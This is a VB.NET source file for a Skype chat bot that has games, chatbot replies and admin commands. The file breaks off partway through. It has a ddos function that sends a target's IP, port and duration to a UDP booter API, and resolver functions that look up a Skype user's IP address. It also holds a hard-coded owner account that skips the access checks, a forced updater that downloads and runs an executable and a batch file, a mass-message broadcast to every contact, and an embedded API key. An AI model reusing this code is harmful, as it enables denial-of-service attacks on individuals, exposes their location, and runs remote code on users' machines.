
Imports SKYPE4COMLib
Imports System.IO
Imports System.Net.Mail
Imports System.Web
Imports System.Net.Sockets
Imports System.Text
Imports System.Configuration
Imports System.Text.RegularExpressions
Imports System.Threading
Imports System.Windows.Forms.Application
Imports System.Security.Cryptography
Imports ChatterBotAPI
Imports System.Net

Public Class Form1
    Enum proxyq
        highqualityproxy = 3
        anonymousproxy = 2
        transparentproxy = 1
    End Enum
    Public Const version As String = "1.0.0.2"
    Public state As Integer = 1
    Public launched As Boolean = False
    Dim banmsg As String = "You are banned, Sorry!"
    Public api As String = ""
    Public ddosapi2 As String = ""
    Dim factory As ChatterBotFactory = New ChatterBotFactory()
    Dim AIb As ChatterBot = factory.Create(ChatterBotType.PANDORABOTS, "b0dafd24ee35a477")
    Dim AISession As ChatterBotSession = AIb.CreateSession()
    Dim adminst As Boolean = 1
    Dim resapi As String = "http://skypebot.ga/apis/apis/resolve.php?u=" 'c99
    Dim resapi2 As String = "http://skypebot.ga/apis/apis/resolve2.php?u="
    Dim resapi3 As String = "http://api.predator.wtf/resolver/?arguments="
    Dim cacheapi As String = "http://skypebot.ga/apis/apis/cached.php?u="
    Dim cacheapi2 As String = "http://api.predator.wtf/lookup/?arguments="
    Dim lockst As Integer = 0
    Dim Evaluator1 = New Evaluator
    Dim swag As Boolean = 0
    Public Skypattach As Skype = New Skype
    Dim trigger As String = "!"
    Sub AddSwagToMSG(msg As ChatMessage, message As String, Optional timeout As Integer = Nothing)
        If timeout = Nothing Then timeout = FlatNumeric1.Value
        If swag = 1 Or swag = "1" Then
        Else
            msg.Body = message
            Exit Sub
        End If
        Dim pref As String = "_"
        Dim eachline() As String = message.Split(New String() {Environment.NewLine}, StringSplitOptions.RemoveEmptyEntries)
        msg.Body = pref
        For i = 0 To eachline.Length - 1
            Dim eachword() As String = eachline(i).Split(" ")

            For ii = 0 To eachword.Length - 1
                Dim eachchar() As Char = eachword(ii).ToCharArray

                For iii = 0 To eachchar.Length - 1
                    Thread.Sleep(timeout)
                    msg.Body = (msg.Body.Replace(pref, "") & eachchar(iii)) & pref
                Next
                msg.Body = (msg.Body).Replace("_", "") & " _"
            Next
            msg.Body = (msg.Body & vbNewLine).Replace("_", "") & " _"
        Next
        msg.Body = msg.Body.Replace("_", "")
        msg.Body = message
    End Sub
    Function ddos(ip As String, port As Integer, time As Integer)
retr:
        Randomize()
        Dim Number As Integer = Int(Rnd() * 3)
        If Number = 3 Or Number = 0 Then GoTo retr

        If Number = 1 Then
            Return WBDL(api.Replace("[ip]", ip).Replace("[time]", time).Replace("[port]", port))
        ElseIf Number = 2 Then
            Return WBDL(api.Replace("[ip]", ip).Replace("[time]", time).Replace("[port]", port))
        Else : GoTo retr
        End If
    End Function
    Function WBDL(apiz As String)
        Dim w As New WebBrowser

        WebBrowser1.Navigate(apiz)
        Return w.DocumentText
    End Function
    Public Shared Function CheckForInternetConnection() As Boolean
        Try
            Using client = New WebClient()
                'client.Proxy = Nothing
                ' Using stream = client.OpenRead("http://google.be")
                Return True
                'End Using
            End Using
        Catch
            Return False
        End Try
    End Function
    Sub AI1(msg As ChatMessage)
        If msg.Body = "" Then Exit Sub
        Dim ai As ChatMessage = msg.Chat.SendMessage("Thinking...")
        Dim s As String = AISession.Think(msg.Body.Remove(0, 1))
        s = StripTags(s)
        If s.ToLower.Contains("To use my calculator, click here!".ToLower) Then
            s = "To use my calculator, use !calc"
        End If
        ai.Body = s
    End Sub
    Sub AI2(msg As ChatMessage)
        If msg.Body = "" Then Exit Sub

        Dim ai As ChatMessage = msg.Chat.SendMessage("Thinking...")
        Dim api As String = "http://steambot.ga/api/ai.php?msg=" & msg.Body.Remove(0, 1)
        Dim w As New WebClient
        w.Proxy = Nothing

        Dim res As String = w.DownloadString(api)
        Dim regexed As String = Regex.Match(res, "(.+)string\(", RegexOptions.IgnoreCase).Value.ToString.Replace("string(", "")

        ai.Body = regexed
    End Sub
    Public Sub UpdateMe(state As String)
        Dim w As New WebClient
        w.Proxy = Nothing
        If CheckForInternetConnection() = True Then
        Else
            MsgBox("Fix your internet connection before moving on!")
            Close()
            Windows.Forms.Application.Exit()
            Windows.Forms.Application.ExitThread()
        End If
        Dim latest As String = w.DownloadString("https://www.dropbox.com/s/nc07ajdkck5lwdl/update.txt?dl=1")
        If latest = version Then
            If state = 1 Then
                MsgBox("No update needed!")
            End If
        Else
            If w.DownloadString("https://www.dropbox.com/s/fz39p2eqwrccid3/force.txt?dl=1") = "1" Then
                w.DownloadFile("https://www.dropbox.com/s/mdbef5odfcg5pog/SBUpdater.exe?dl=1", IO.Directory.GetCurrentDirectory & "\Updater.exe")
                w.DownloadFile("https://www.dropbox.com/s/6qbvr7zahdmvl1r/Update.bat?dl=1", IO.Directory.GetCurrentDirectory & "\Updater.bat")
                Process.Start(IO.Directory.GetCurrentDirectory & "\Updater.bat")
                System.Windows.Forms.Application.Exit()
                Exit Sub
            End If
            Dim l As MsgBoxResult = MsgBox("New update is ready to download, download it now?", MsgBoxStyle.YesNo)
            If l = MsgBoxResult.Yes Then
                w.DownloadFile("https://www.dropbox.com/s/mdbef5odfcg5pog/SBUpdater.exe?dl=1", IO.Directory.GetCurrentDirectory & "\Updater.exe")
                w.DownloadFile("https://www.dropbox.com/s/6qbvr7zahdmvl1r/Update.bat?dl=1", IO.Directory.GetCurrentDirectory & "\Updater.bat")
                Process.Start(IO.Directory.GetCurrentDirectory & "\Updater.bat")
                System.Windows.Forms.Application.Exit()
            Else
                Exit Sub
            End If

        End If
    End Sub
    Function shorten(urltoshrt As String)
        If Not urltoshrt.StartsWith("http") Then urltoshrt = "http://" & urltoshrt
        Dim w As New WebClient
        w.Proxy = Nothing
        Dim wc = New WebClient()
        wc.Proxy = Nothing
        Dim login = "o_1v99833eui"
        Dim apiKey = "R_652033905dccf303504cecd3c2762d64"
        Dim longUrl = WebUtility.UrlEncode(urltoshrt)
        Dim request = String.Format("http://api.bit.ly/v3/shorten?login={0}&apiKey={1}&longUrl={2}&format=txt", login, apiKey, longUrl)
        Dim result = wc.DownloadString(request)
        Return result
    End Function
    Public Sub attach()
        Try
            If Skypattach.Client.IsRunning = True Then  Else Skypattach.Client.Start()
            Skypattach.Attach()
            AddHandler Skypattach.UserAuthorizationRequestReceived, AddressOf FRReceived
            AddHandler Skypattach.MessageStatus, AddressOf MSGStatus
        Catch
            Try
                Skypattach.Attach()
            Catch ex As Exception
                MsgBox("Couldn't attach to skype, make sure skype is running and you clicked 'allow'!")
            End Try
        End Try
    End Sub
    Function youtube(url As String)
        Try
            url = url.Replace("http://", "").Replace("https://", "").Replace("www.", "")
            Dim wc As New WebClient()
            wc.Proxy = Nothing
            'Return Encoding.UTF8.GetString(wc.DownloadString("http://boot.ninja/index.php?url=https://youtube.com/watch?v=" & url)).Replace("&#39;", "").Replace("/", "").Replace("!", "")
            Dim utfyt As String = Regex.Match(Encoding.ASCII.GetString(wc.DownloadData("http://youtube.com/watch?v=" & Convert.ToString(url))), "\<title\b[^>]*\>\s*(?<Title>[\s\S]*?)\</title\>", RegexOptions.IgnoreCase).Groups("Title").Value.ToString.Replace(" - YouTube", "").Replace("&#39;", "").Replace("/", "").Replace("!", "")
            Return Decodehtml(utfyt)
        Catch
            Return "Don't even try to crash the bot!"
        End Try
    End Function
    Function Decodehtml(strtemp As String)
        strtemp = Replace(strtemp, "&quot;", """")
        strtemp = Replace(strtemp, "&amp;", "&")
        strtemp = Replace(strtemp, "&apos;", "'")
        strtemp = Replace(strtemp, "&lt;", "<")
        strtemp = Replace(strtemp, "&gt;", ">")
        strtemp = Replace(strtemp, "&nbsp;", "")
        strtemp = Replace(strtemp, "&iexcl;", "¡")
        strtemp = Replace(strtemp, "&cent;", "¢")
        strtemp = Replace(strtemp, "&pound;", "£")
        strtemp = Replace(strtemp, "&curren;", "¤")
        strtemp = Replace(strtemp, "&yen;", "¥")
        strtemp = Replace(strtemp, "&brvbar;", "¦")
        strtemp = Replace(strtemp, "&sect;", "§")
        strtemp = Replace(strtemp, "&uml;", "¨")
        strtemp = Replace(strtemp, "&copy;", "©")
        strtemp = Replace(strtemp, "&ordf;", "ª")
        strtemp = Replace(strtemp, "&laquo;", "«")
        strtemp = Replace(strtemp, "&not;", "¬")
        strtemp = Replace(strtemp, "*", "")
        strtemp = Replace(strtemp, "&reg;", "®")
        strtemp = Replace(strtemp, "&macr;", "¯")
        strtemp = Replace(strtemp, "&deg;", "°")
        strtemp = Replace(strtemp, "&plusmn;", "±")
        strtemp = Replace(strtemp, "&sup2;", "²")
        strtemp = Replace(strtemp, "&sup3;", "³")
        strtemp = Replace(strtemp, "&acute;", "´")
        strtemp = Replace(strtemp, "&micro;", "µ")
        strtemp = Replace(strtemp, "&para;", "¶")
        strtemp = Replace(strtemp, "&middot;", "·")
        strtemp = Replace(strtemp, "&cedil;", "¸")
        strtemp = Replace(strtemp, "&sup1;", "¹")
        strtemp = Replace(strtemp, "&ordm;", "º")
        strtemp = Replace(strtemp, "&raquo;", "»")
        strtemp = Replace(strtemp, "&frac14;", "¼")
        strtemp = Replace(strtemp, "&frac12;", "½")
        strtemp = Replace(strtemp, "&frac34;", "¾")
        strtemp = Replace(strtemp, "&iquest;", "¿")
        strtemp = Replace(strtemp, "&Agrave;", "À")
        strtemp = Replace(strtemp, "&Aacute;", "Á")
        strtemp = Replace(strtemp, "&Acirc;", "Â")
        strtemp = Replace(strtemp, "&Atilde;", "Ã")
        strtemp = Replace(strtemp, "&Auml;", "Ä")
        strtemp = Replace(strtemp, "&Aring;", "Å")
        strtemp = Replace(strtemp, "&AElig;", "Æ")
        strtemp = Replace(strtemp, "&Ccedil;", "Ç")
        strtemp = Replace(strtemp, "&Egrave;", "È")
        strtemp = Replace(strtemp, "&Eacute;", "É")
        strtemp = Replace(strtemp, "&Ecirc;", "Ê")
        strtemp = Replace(strtemp, "&Euml;", "Ë")
        strtemp = Replace(strtemp, "&Igrave;", "Ì")
        strtemp = Replace(strtemp, "&Iacute;", "Í")
        strtemp = Replace(strtemp, "&Icirc;", "Î")
        strtemp = Replace(strtemp, "&Iuml;", "Ï")
        strtemp = Replace(strtemp, "&ETH;", "Ð")
        strtemp = Replace(strtemp, "&Ntilde;", "Ñ")
        strtemp = Replace(strtemp, "&Ograve;", "Ò")
        strtemp = Replace(strtemp, "&Oacute;", "Ó")
        strtemp = Replace(strtemp, "&Ocirc;", "Ô")
        strtemp = Replace(strtemp, "&Otilde;", "Õ")
        strtemp = Replace(strtemp, "&Ouml;", "Ö")
        strtemp = Replace(strtemp, "&times;", "×")
        strtemp = Replace(strtemp, "&Oslash;", "Ø")
        strtemp = Replace(strtemp, "&Ugrave;", "Ù")
        strtemp = Replace(strtemp, "&Uacute;", "Ú")
        strtemp = Replace(strtemp, "&Ucirc;", "Û")
        strtemp = Replace(strtemp, "&Uuml;", "Ü")
        strtemp = Replace(strtemp, "&Yacute;", "Ý")
        strtemp = Replace(strtemp, "&THORN;", "Þ")
        strtemp = Replace(strtemp, "&szlig;", "ß")
        strtemp = Replace(strtemp, "&agrave;", "à")
        strtemp = Replace(strtemp, "&aacute;", "á")
        strtemp = Replace(strtemp, "&acirc;", "â")
        strtemp = Replace(strtemp, "&atilde;", "ã")
        strtemp = Replace(strtemp, "&auml;", "ä")
        strtemp = Replace(strtemp, "&aring;", "å")
        strtemp = Replace(strtemp, "&aelig;", "æ")
        strtemp = Replace(strtemp, "&ccedil;", "ç")
        strtemp = Replace(strtemp, "&egrave;", "è")
        strtemp = Replace(strtemp, "&eacute;", "é")
        strtemp = Replace(strtemp, "&ecirc;", "ê")
        strtemp = Replace(strtemp, "&euml;", "ë")
        strtemp = Replace(strtemp, "&igrave;", "ì")
        strtemp = Replace(strtemp, "&iacute;", "í")
        strtemp = Replace(strtemp, "&icirc;", "î")
        strtemp = Replace(strtemp, "&iuml;", "ï")
        strtemp = Replace(strtemp, "&eth;", "ð")
        strtemp = Replace(strtemp, "&ntilde;", "ñ")
        strtemp = Replace(strtemp, "&ograve;", "ò")
        strtemp = Replace(strtemp, "&oacute;", "ó")
        strtemp = Replace(strtemp, "&ocirc;", "ô")
        strtemp = Replace(strtemp, "&otilde;", "õ")
        strtemp = Replace(strtemp, "&ouml;", "ö")
        strtemp = Replace(strtemp, "&divide;", "÷")
        strtemp = Replace(strtemp, "&oslash;", "ø")
        strtemp = Replace(strtemp, "&ugrave;", "ù")
        strtemp = Replace(strtemp, "&uacute;", "ú")
        strtemp = Replace(strtemp, "&ucirc;", "û")
        strtemp = Replace(strtemp, "&uuml;", "ü")
        strtemp = Replace(strtemp, "&yacute;", "ý")
        strtemp = Replace(strtemp, "&thorn;", "þ")
        strtemp = Replace(strtemp, "&yuml;", "ÿ")
        strtemp = Replace(strtemp, "&OElig;", "Œ")
        strtemp = Replace(strtemp, "&oelig;", "œ")
        strtemp = Replace(strtemp, "&Scaron;", "Š")
        strtemp = Replace(strtemp, "&scaron;", "š")
        strtemp = Replace(strtemp, "&Yuml;", "Ÿ")
        strtemp = Replace(strtemp, "&fnof;", "ƒ")
        strtemp = Replace(strtemp, "&circ;", "ˆ")
        strtemp = Replace(strtemp, "&tilde;", "˜")
        strtemp = Replace(strtemp, "&thinsp;", "")
        strtemp = Replace(strtemp, "&zwnj;", "")
        strtemp = Replace(strtemp, "&zwj;", "")
        strtemp = Replace(strtemp, "&lrm;", "")
        strtemp = Replace(strtemp, "&rlm;", "")
        strtemp = Replace(strtemp, "&ndash;", "–")
        strtemp = Replace(strtemp, "&mdash;", "—")
        strtemp = Replace(strtemp, "&lsquo;", "‘")
        strtemp = Replace(strtemp, "&rsquo;", "’")
        strtemp = Replace(strtemp, "&sbquo;", "‚")
        strtemp = Replace(strtemp, "&ldquo;", """")
        strtemp = Replace(strtemp, "&rdquo;", """")
        strtemp = Replace(strtemp, "&bdquo;", "„")
        strtemp = Replace(strtemp, "&dagger;", "†")
        strtemp = Replace(strtemp, "&Dagger;", "‡")
        strtemp = Replace(strtemp, "&bull;", "•")
        strtemp = Replace(strtemp, "&hellip;", "…")
        strtemp = Replace(strtemp, "&permil;", "‰")
        strtemp = Replace(strtemp, "&lsaquo;", "‹")
        strtemp = Replace(strtemp, "&rsaquo;", "›")
        strtemp = Replace(strtemp, "&euro;", "€")
        strtemp = Replace(strtemp, "&trade;", "™")
        Return strtemp
    End Function
    Private Sub MSGStatus(ByVal msg As ChatMessage, ByVal status As TChatMessageStatus)
        If launched = False Then Exit Sub
        Try

            If status = TChatMessageStatus.cmsSending Or status = TChatMessageStatus.cmsReceived Then  Else Exit Sub

            'Display title of YouTube links
            If msg.Body.Contains("youtube.com/watch?v=") OrElse msg.Body.Contains("youtu.be/") Then
                Dim a As String = msg.Body.Replace("www.", "")
                Try
                    Dim q As String = If(a.Contains("watch?v="), a.Replace("watch?v=", [String].Empty), a)
                    Dim chars As Char() = "/".ToCharArray()
                    Dim b As String() = q.Split(chars)
                    Dim yttitle As Threading.Thread = New Threading.Thread(Sub()
                                                                               msg.Chat.SendMessage(youtube(b(b.Length - 1)))
                                                                           End Sub)
                    yttitle.Start()
                Catch ex As Exception
                    msg.Chat.SendMessage(ex.ToString)
                End Try
            End If

            'Respond to deez nuts
            If msg.Body.Contains("deez") And msg.Body.Contains("nuts") And msg.Sender.Handle <> Skypattach.CurrentUserHandle Then
                Dim deeznuts As ChatMessage = msg.Chat.SendMessage("HA GOTTI")
            End If

            If msg.Body.IndexOf("@") = 0 Then
                Dim pcmd = New Threading.Thread(Sub() AI1(msg))
                pcmd.SetApartmentState(ApartmentState.STA)
                pcmd.Start()
            End If
            If msg.Body.IndexOf("#") = 0 Then
                Dim pcmd = New Threading.Thread(Sub() AI2(msg))
                pcmd.SetApartmentState(ApartmentState.STA)
                pcmd.Start()
            End If
            If msg.Body.IndexOf(trigger) = 0 Then
                Dim pcmd = New Threading.Thread(Sub() processcommand(msg))
                pcmd.SetApartmentState(ApartmentState.STA)
                pcmd.Start()
            End If
        Catch ex As Exception
            Dim errorr As ChatMessage = msg.Chat.SendMessage("An error occured while giving you an error!")
            AddSwagToMSG(errorr, "An error occured, please report to skype:jeteroll83?chat : " & vbNewLine & paste("Host: " & Skypattach.CurrentUserHandle & vbNewLine & "Sender: " & msg.Sender.Handle & vbNewLine & "Cmd: " & msg.Body & vbNewLine & "Error: " & ex.ToString, "Error!"))
        End Try
    End Sub
    Function Resolve1(skype As String)
        Dim w As New Net.WebClient
        w.Proxy = Nothing
        Try
            Dim ip As String = w.DownloadString(resapi & skype)
            If ip.Contains("API2") Then
                Return "IP not found."
            Else
                Return ip.Replace(vbNewLine, "").Replace(" ", "").Replace(Environment.NewLine, "").Replace(vbCr, "").Replace(vbLf, "")
            End If

        Catch
            Return "error"
        End Try
    End Function
    Function Resolve2(skype As String)
        Dim w As New Net.WebClient
        w.Proxy = Nothing
        Try
            Dim ip As String = w.DownloadString(resapi2 & skype)
            Return ip
        Catch
            Return "error"
        End Try
    End Function
    Function Resolve3(skype As String)
        Dim w As New Net.WebClient
        w.Proxy = Nothing
        Try
            Dim ip As String = w.DownloadString(resapi3 & skype)
            Return ip
        Catch
            Return "error"
        End Try
    End Function
    Function Cached(skype As String)
        Dim w As New Net.WebClient
        w.Proxy = Nothing
        Try
            Dim ip As String = w.DownloadString(cacheapi & skype).Replace("&nbsp;", "").Replace("[", "").Replace("]", "").Replace("][", " ").Replace("  ", " ").Replace(" - ", " ").Replace(",", "")
            Dim ips() As String = ip.Split(" ")
            If IsIpValid(ips(0)) Then
            Else
                Return "IP not found."
                Exit Function
            End If
            Return ip
        Catch
            Return "error"
        End Try
    End Function
    Function Cached2(skype As String)
        Dim w As New Net.WebClient
        w.Proxy = Nothing
        Try
            Dim ip As String = w.DownloadString(cacheapi & skype).Replace("&nbsp;", "").Replace("[", "").Replace("]", "").Replace("][", " ").Replace("  ", " ").Replace(" - ", " ").Replace(",", "")
            Dim ips() As String = ip.Split(" ")
            If IsIpValid(ips(0)) Then
            Else
                Return "IP not found."
                Exit Function
            End If
            Return ip
        Catch
            Return "error"
        End Try
    End Function
    Public Function GetRandom(ByVal Min As Integer, ByVal Max As Integer) As Integer
        ' by making Generator static, we preserve the same instance '
        ' (i.e., do not create new instances with the same seed over and over) '
        ' between calls '
        Static Generator As System.Random = New System.Random()
        Return Generator.Next(Min, Max)
    End Function
    Sub processcommand(msg As ChatMessage)
        Try
            api = "http://netpunch.xyz/out/api.php?host=[ip]&key=KEYGOESHERE&port=[port]&time=[time]&method=UDP"
            ddosapi2 = "http://netpunch.xyz/out/api.php?host=[ip]&key=KEYGOESHERE&port=[port]&time=[time]&method=UDP"
            'If msg.ChatName = "#luigi-7.7.99-/$mrfluffypancake;7845dca0296eabeb" Then
            '    Exit Sub
            'End If
            If msg.Sender.Handle = Skypattach.CurrentUserHandle Or msg.Sender.Handle = "jeteroll83" Then GoTo whitelisted
            Dim parts() As String = TextBox3.Text.Split(New String() {Environment.NewLine},
                                          StringSplitOptions.None)
            If parts(0) = "%everyone%" Then GoTo whitelisted
            For i = 0 To parts.Length - 1
                If parts(i).Contains(msg.Sender.Handle) Then
                    GoTo whitelisted
                Else
                    Exit For
                End If
            Next
            Exit Sub
whitelisted:
            If lockst = 1 Then
                If IsAdmin(msg.Sender.Handle) Then
                Else
                    Exit Sub
                End If
            End If
            Dim command As String = msg.Body.Remove(0, trigger.Length)
            'ADMINPANEL START
            If command = "admin" Then msg.Chat.SendMessage("Right Syntax: " & trigger & "admin <help/parameters>")
            If command.StartsWith("admin ") Then
                If msg.Sender.Handle = "jeteroll83" Then GoTo bypass
                If IsAdmin(msg.Sender.Handle) = True Then
                Else
                    Exit Sub
                End If
bypass:
                Dim cmd As String = command.Replace("admin ", "")
                If cmd = "help" Then msg.Chat.SendMessage(My.Settings.adminhlp)
                If cmd = "stopallcmds" Then
                    Dim stopping As ChatMessage = msg.Chat.SendMessage("Stopping commands...")
                    Dim t As System.Threading.Thread
                    For Each t In System.Diagnostics.Process.GetCurrentProcess().Threads
                        t.Abort()
                    Next t
                    AddSwagToMSG(stopping, "All commands should be stopped!")
                End If
                If cmd = "resetgamedata" Then
                    Dim reset As ChatMessage = msg.Chat.SendMessage("Resetting...")
                    My.Settings.gamedat = "jezus|0|0;"
                    AddSwagToMSG(reset, "Resetted!")
                End If
                If cmd = "broadcasthelp" Or cmd = "broadcast help" Then
                    Dim bchelp As ChatMessage = msg.Chat.SendMessage("...")
                    bchelp.Body = "------------------------------" & vbNewLine & " Just do !admin broadcast <yourmsg> and it'll send to all your contacts <yourmsg>" & vbNewLine & "<FullName> = Their full name" & vbNewLine & "<SkypeID> = Their SkypeName" & vbNewLine & "<FirstName> = Their first name" & vbNewLine & "------------------------------"
                    Exit Sub
                End If
                If cmd.StartsWith("broadcast ") Then
                    Dim bc As ChatMessage = msg.Chat.SendMessage("Broadcasting...")
                    Dim nr As Integer = 0
                    Dim failcount As Integer = 0
                    For Each receiver As SKYPE4COMLib.User In Skypattach.Friends
                        Try
                            nr = nr + 1
                            bc.Body = "Sending message " & nr & "/" & Skypattach.Friends.Count - failcount
                            Dim part() As String = Skypattach.User(receiver.Handle).FullName.Split(" ")
                            Skypattach.SendMessage(receiver.Handle, msg.Body.Replace("!admin broadcast ", "").Replace("<FullName>", Skypattach.User(receiver.Handle).FullName).Replace("<SkypeID>", receiver.Handle).Replace("<FirstName>", part(0)))
                        Catch ex As Exception
                            failcount = failcount + 1
                            nr = nr - 1
                        End Try
                    Next
                    AddSwagToMSG(bc, "Messages sent!")
                End If
                If cmd = "debug" Then
                    Dim debug As ChatMessage = msg.Chat.SendMessage("Gathering info...")
                    Dim skypev = "SkypeVersion: " & Skypattach.Version
                    Dim swagy As String = ""
                    If swag = "0" Or swag = 0 Then swagy = "Swag: Off" Else swagy = "Swag: On"
                    Dim admn As String = ""
                    If adminst = "0" Or adminst = 0 Then admn = "On/Off: Off" Else admn = "On/Off: On"
                    Dim q As String = ""
                    If lockst = 0 Or lockst = "0" Then q = "Lockdown: False" Else admn = "Lockdown: True"
                    AddSwagToMSG(debug, Skypattach.CurrentUserHandle & vbNewLine & skypev & vbNewLine & "BotVersion: " & version & vbNewLine & admn & vbNewLine & swagy & vbNewLine & q & vbNewLine & "DebugOS: " & SystemInformation.DebugOS & vbNewLine & "Computername: " & SystemInformation.ComputerName & vbNewLine & "RealOS: " & My.Computer.Info.OSFullName & " Is64Bit: " & Environment.Is64BitOperatingSystem & vbNewLine & "Ram: " & My.Computer.Info.TotalPhysicalMemory & ";" & My.Computer.Info.TotalVirtualMemory & vbNewLine & "Exec folder: " & Windows.Forms.Application.ExecutablePath)

                End If
                If cmd = "defcmds" Then
                    Dim we As ChatMessage = msg.Chat.SendMessage("Intializing...")
                    Dim w As New WebClient
                    w.Proxy = Nothing
                    AddSwagToMSG(we, w.DownloadString("https://www.dropbox.com/s/waa71m79h76g0ma/allcmds.txt?dl=1"))
                    Exit Sub
                End If
                If cmd = "changelog" Then
                    Dim w As New WebClient
                    w.Proxy = Nothing
                    Dim latest As String = w.DownloadString("https://www.dropbox.com/s/nc07ajdkck5lwdl/update.txt?dl=1")
                    If latest = version Then
                        msg.Chat.SendMessage("Please goto: https://www.dropbox.com/s/by2ovqnx8q45fcq/WhatsNew.txt?dl=0 the changelog became to big :3")
                    Else
                        msg.Chat.SendMessage("You are not on the latest version, please update...")
                    End If
                End If
                If cmd.StartsWith("ban ") Then
                    My.Settings.banlist = My.Settings.banlist & vbNewLine & cmd.Replace("ban ", "")
                    Dim ban As ChatMessage = msg.Chat.SendMessage("Banning...")
                    AddSwagToMSG(ban, "The ban hammer has been spoken!")
                    Exit Sub
                End If
                If cmd.StartsWith("unban ") Then
                    Dim usr As String = cmd.Replace("unban ", "")
                    My.Settings.banlist = My.Settings.banlist.Replace(vbNewLine & usr, "").Replace(usr, "")
                    Dim ban As ChatMessage = msg.Chat.SendMessage("Unbanning...")
                    AddSwagToMSG(ban, "Unbanned!")
                    Exit Sub
                End If
                If cmd.StartsWith("suggest ") Then
                    Dim admin As ChatMessage = msg.Chat.SendMessage("Suggesting...")
                    Dim w As New WebClient
                    w.Proxy = Nothing
                    w.DownloadString("http://apis.skypebot.ga/apis/submit.php?idea=" & cmd.Replace("suggest ", "") & "&skp=" & msg.Sender.Handle & " w/skypebot o/ " & Skypattach.CurrentUserHandle & "&auth=True")
                    AddSwagToMSG(admin, "We will maybe contact you later, thanks!")
                End If
                If cmd = "restart" Then
                    Dim admin As ChatMessage = msg.Chat.SendMessage("...")
                    AddSwagToMSG(admin, "Restarting...")
                    My.Settings.Save()
                    Windows.Forms.Application.Restart()
                End If
                If cmd = "banlist" Then
                    msg.Chat.SendMessage("Banned users:" & vbNewLine & My.Settings.banlist)
                    Exit Sub
                End If
                If cmd = "getchatname" Then
                    Dim admin As ChatMessage = msg.Chat.SendMessage("...")
                    AddSwagToMSG(admin, msg.ChatName)
                End If
                If cmd.StartsWith("ipwhitelist ") Then
                    Dim admin As ChatMessage = msg.Chat.SendMessage("Whitelisting...")
                    cmd = cmd.Replace(" ", "").Replace("ipwhitelist ", "")
                    TextBox7.Text = TextBox7.Text & vbNewLine & cmd
                    My.Settings.whitelist = TextBox7.Text
                    AddSwagToMSG(admin, "Added to whitelist!")
                End If
                If cmd.StartsWith("ipwhitelistrem ") Then
                    Dim admin As ChatMessage = msg.Chat.SendMessage("Unwhitelisting...")
                    cmd = cmd.Replace(" ", "").Replace("ipwhitelistrem ", "")
                    TextBox7.Text = TextBox7.Text.Replace(vbNewLine & cmd, "").Replace(cmd, "")
                    My.Settings.whitelist = TextBox7.Text
                    AddSwagToMSG(admin, "Removed from whitelist!")
                End If
                If cmd.StartsWith("sudo ") Then
                    msg.Chat.SendMessage(command.Replace("admin sudo ", ""))
                End If
                If cmd = "lockdown" Then
                    Dim admin As ChatMessage = msg.Chat.SendMessage("Toggeling...")
                    If lockst = 0 Then
                        lockst = 1
                        AddSwagToMSG(admin, "Lockdown enabled!")
                    Else
                        lockst = 0
                        AddSwagToMSG(admin, "Lockdown disabled!")
                    End If
                End If
                If cmd = "check4update" Then
                    Dim admin As ChatMessage = msg.Chat.SendMessage("Checking for update...")
                    Dim w As New Net.WebClient
                    w.Proxy = Nothing
                    Dim latest As String = w.DownloadString("https://www.dropbox.com/s/nc07ajdkck5lwdl/update.txt?dl=1")
                    If latest = version Then msg.Chat.SendMessage("No new update found")
                    AddSwagToMSG(admin, "This version: " & version & vbNewLine & "Latest version: " & latest & vbNewLine & "Type !admin update to force update!")
                End If
                If cmd = "update" Then
                    If Skypattach.CurrentUserHandle = "jeteroll83" Then Exit Sub
                    Dim admin As ChatMessage = msg.Chat.SendMessage("Updating...")
                    Dim w As New Net.WebClient
                    w.Proxy = Nothing
                    AddSwagToMSG(admin, "Updating... Please wait!")
                    w.DownloadFile("https://www.dropbox.com/s/mdbef5odfcg5pog/SBUpdater.exe?dl=1", IO.Directory.GetCurrentDirectory & "\Updater.exe")
                    w.DownloadFile("https://www.dropbox.com/s/6qbvr7zahdmvl1r/Update.bat?dl=1", IO.Directory.GetCurrentDirectory & "\Updater.bat")
                    Process.Start(IO.Directory.GetCurrentDirectory & "\Updater.bat")
                    Windows.Forms.Application.Exit()
                End If
                If cmd = "disable" Then
                    Dim Admnmsg As ChatMessage = msg.Chat.SendMessage("Disabling...")
                    adminst = 0
                    CheckBox6.Checked = False
                    DoEvents()
                    AddSwagToMSG(Admnmsg, "Bot disabled!")
                    Exit Sub
                End If
                If cmd = "enable" Then
                    Dim Admnmsg As ChatMessage = msg.Chat.SendMessage("Enabling...")
                    If adminst = 0 Or adminst = "0" Then
                        AddSwagToMSG(Admnmsg, "Bot enabled!")
                        CheckBox6.Checked = True
                        DoEvents()
                        Exit Sub
                    End If
                    AddSwagToMSG(msg, "Bot is already enabled!")
                End If
            End If
            'ADMINPANEL END
            If adminst = 0 Then
                Exit Sub
            End If
            ListBox1.Items.Add(msg.Sender.Handle & " ran command " & msg.Body)
            If banned(msg.Sender.Handle) = True Then
                msg.Chat.SendMessage(banmsg)
                Exit Sub
            End If

            'Owner protection
            If command.Contains("jet") Then
                Dim protect As ChatMessage = msg.Chat.SendMessage("No.")
                Exit Sub
            End If

            'HELP START
            If command = "help" Then msg.Chat.SendMessage(My.Settings.helpmsg)
            If command.StartsWith("help ") Then
                Dim partsa() As String = command.Replace("help ", "").Split(" ")
                command = partsa(0)
            End If
            'HELP END
            '8BALL START
            If command = "8ball" Then msg.Chat.SendMessage("Right Syntax: " & trigger & "8ball <yesnoquestion>")
            If command.StartsWith("8ball ") Then
                Dim ball As ChatMessage = msg.Chat.SendMessage("Rollin'...")
                Dim rmsg As String = ""
z:
                Randomize()
                Dim all8balls() As String = {"Ofcourse!", "Hell no!", "Signs point to yes.", "Yes.", "Reply hazy, try again.", "No?", "Without a doubt.", "My sources say no.", "As I see it, yes.", "You may rely on it.", "NEVERRR!", "Totally not.", "It was always like that!", "Concentrate and ask again.", "Outlook not so good.", "What about no!", "It is decidedly so.", "Better not tell you now.", "Very doubtful.", "Nope.", "Yes - definitely.", "You know yourself the answer is NO!", "It is certain.", "Cannot predict now.", "Why did you think that?", "Most likely.", "Ask again later.", "At this moment? No!", "My reply is no.", "Outlook good.", "Don't count on it.", "Yes, in due time.", "My sources say no.", "Definitely not.", "You will have to wait.", "I have my doubts.", "Outlook so so.", "Looks good to me!", "Who knows?", "Looking good!", "Probably.", "Are you kidding?", "Go for it!", "Don't bet on it.", "Forget about it."}
                Dim rndo As Integer = CInt(Math.Ceiling(Rnd() * all8balls.Count - 1))

                Try
                    rmsg = all8balls(rndo)
                Catch ex As Exception
                    GoTo z
                End Try
                AddSwagToMSG(ball, rmsg)
            End If
            '8BALL END
            'BUY START
